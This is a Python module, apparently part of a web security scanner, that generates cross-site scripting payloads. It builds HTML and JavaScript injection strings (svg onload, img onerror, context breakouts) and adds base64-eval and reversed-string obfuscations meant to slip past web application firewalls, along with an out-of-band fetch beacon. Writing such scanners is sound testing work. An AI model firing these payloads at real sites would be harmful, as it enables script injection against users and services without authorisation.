import base64, string, random 
import urllib.parse
from pluck.module import GenerationModule

    
class XssGen(GenerationModule):
    def __init__(self):
        self.javascript_popup_templates = [
            'POPUP("UNIQUE")',
            'POPUP`UNIQUE`',
            '(POPUP`UNIQUE`)',
            '{POPUP`UNIQUE`}',
            '[POPUP`UNIQUE`]',
            '(((POPUP)))`UNIQUE`',
            'new class extends POPUP`UNIQUE`{}',
            '["UNIQUE"].find(POPUP)',
            '[1337].map(POPUP)'
        ]
        self.javascript_logger_templates = [
            'console.log("UNIQUE")',
        ]
        self.javascript_dom_templates = [  
            'document.body.innerHTML += \'<div id="UNIQUE">\'',
            'document.body.setAttribute("UNIQUE", "true");', 
        ]
        self.javascript_oast_templates = [
            'fetch(\'DOMAIN/UNIQUE\');',
        ]
        self.html_tag_templates = [
            '<svg/onload="PAYLOAD">',
            '<svg><script>PAYLOAD</script></svg>',
            '<img/src="x"/onerror="PAYLOAD">',
            '<img src=x onerror="PAYLOAD">',
            '<svg/onload="PAYLOAD"//>',
            '<svg><animate onbegin="PAYLOAD">',
        ]

        
        self.waf_bypass = False
        self.reverse_payload = False
        self.domain = "http://127.0.0.1"
        self.custom_html_attribute = []
        self.custom_html_tags = []

        self.evidence_strings = []

    def generate_custom_html_templates(self):
        if not len(self.custom_html_attribute):
            # attributes = [a.strip() for a in self.custom_html_attribute.split(",")] if "," in self.custom_html_attribute else [self.custom_html_attribute.strip()]
            self.custom_html_attribute = ["onload","onerror", "onmouseover"]


        result = []
        template = "<TAG/ATTRIBUTES>"
        attr_template = "ATTR=\'PAYLOAD\'"
        for tag in self.custom_html_tags:
            attribs = "/".join([attr_template.replace("ATTR",a) for a in self.custom_html_attribute])
            result.append(template.replace("ATTRIBUTES",attribs).replace("TAG",tag))
        
        if len(result) > 0:
            self.html_tag_templates = result
        
        return result
            
    def generate_popup_payloads(self):

        raw_popup_payloads = [p.replace("UNIQUE",self.unique_string).replace("POPUP","confirm") for p in self.javascript_popup_templates]
        
        return self.mutate_payloads(raw_popup_payloads)

    def generate_dom_modify_payloads(self):
           
        raw_payloads = [p.replace("UNIQUE",self.unique_string) for p in self.javascript_dom_templates]        
        return self.mutate_payloads(raw_payloads)

    def generate_logger_payloads(self):
       
        raw_payloads = [p.replace("UNIQUE",self.unique_string) for p in self.javascript_logger_templates]
        return self.mutate_payloads(raw_payloads)

    def generate_oast_payloads(self):
        
        raw_payloads = [p.replace("UNIQUE",self.unique_string).replace("DOMAIN",self.domain) for p in self.javascript_oast_templates]
        return self.mutate_payloads(raw_payloads)
        

    def mutate_payloads(self, raw_payloads):
        
        result_payloads = []

        # insert raw payloads into tag templates
        html_tag_payloads = self.generate_html_payloads(raw_payloads)

        js_context_breakup = self.generate_js_context_break(raw_payloads)

        attr_context_breakup = self.generate_attribute_context_break(raw_payloads)

        result_payloads.extend(raw_payloads)
        result_payloads.extend(html_tag_payloads)
        result_payloads.extend(js_context_breakup)
        result_payloads.extend(attr_context_breakup)
        

        if self.waf_bypass:
            waf_payloads = self.generate_b64_eval(raw_payloads)
            result_payloads.extend(self.generate_html_payloads(waf_payloads))
            result_payloads.extend(self.generate_js_context_break(waf_payloads))
            result_payloads.extend(self.generate_attribute_context_break(waf_payloads))
            
        if self.reverse_payload:
            reverse_payloads = self.reverse_js_payload(raw_payloads)
            result_payloads.extend(self.generate_html_payloads(reverse_payloads))
            result_payloads.extend(self.generate_js_context_break(reverse_payloads))
            result_payloads.extend(self.generate_attribute_context_break(reverse_payloads))
 
        url_encoded = [urllib.parse.quote(p) for p in result_payloads]
        result_payloads.extend(url_encoded)

        return result_payloads
    
    def reverse_js_payload(self, js_payloads):
        result = []

        for js in js_payloads:
            reverse = self.encode_base64_for_btoa(js)[::-1]
            result.append(f"setTimeout(atob('{reverse}'.split('').reverse().join('')))")
        return result

    def generate_b64_eval(self, js_payloads):
        result = []

        for jsp in js_payloads:
            b64_payload = self.encode_base64_for_btoa(jsp)
            created = f"eval(atob('{b64_payload}'))"
            result.append(created)
            eval1 = created.replace("eval","window['e'+'v'+'a'+'l']")
            eval2 = created.replace("eval","\\u0065\\u0076\\u0061\\u006c")
            eval3 = created.replace("eval","setTimeout")
            result.append(eval1)
            result.append(eval2)
            result.append(eval3)
            eval4 = created.replace("atob","window['at'+'ob']")
            result.append(eval4)
            eavl5 = created.replace("eval","window[atob('ZXZhbA']")

            num = int(len(created)/2)
            created2 = created[:num] + "'+'"+created[num:]
            result.append(created2)
        return result

    # Generate payloads in HTML templates
    def generate_html_payloads(self, js_payloads):
        result_payloads = []
        for html in self.html_tag_templates:
            for js in js_payloads:
                result_payloads.append(html.replace("PAYLOAD",js))
        return result_payloads

    # Generate JavaScript contextual breakups
    def generate_js_context_break(self,js_payloads):
        js_context = [
            "'-PAYLOAD-'",
            "'-PAYLOAD//'",
            "'}PAYLOAD;{'",
            "'}%0APAYLOAD;%0A{'",
            "}]}';PAYLOAD;//",
            "</script><svg/onload=PAYLOAD>"
        ]
        result = []
        for context in js_context:
            for p in js_payloads:
                result.append(context.replace("PAYLOAD",p))
        return result

    # Generate Attrivute Contextual Payloads
    def generate_attribute_context_break(self, js_payloads):
        attribute_context = [
            '"><svg onload=PAYLOAD>',
            '"><svg onload=PAYLOAD><b attr="',
            '" onmouseover=PAYLOAD "',
            '"onmouseover=PAYLOAD//',
            '"autofocus/onfocus="PAYLOAD'

        ]
        result = []
        for context in attribute_context:
            for p in js_payloads:
                result.append(context.replace("PAYLOAD",p))
        return result

    # Bemeneti string Base64 Encode-olása és opcionális remove padding
    def encode_base64_for_btoa(self, input_str, remove_padding=True):
        # A bemenetet latin1 (ISO-8859-1) formátumba konvertáljuk
        encoded_bytes = base64.b64encode(input_str.encode('latin1'))
        
        # Visszaalakítás string formátumba, hogy JavaScript-ben használható legyen
        if remove_padding:
            return encoded_bytes.decode('ascii').replace("=","")
        else:
            return encoded_bytes.decode('ascii')
    
    def generate_payloads(self):
        
        dom = self.generate_dom_modify_payloads()
        logger = self.generate_logger_payloads()
        oast = self.generate_oast_payloads()
        
        self.evidence_strings.append(self.unique_string)

        return dom+logger+oast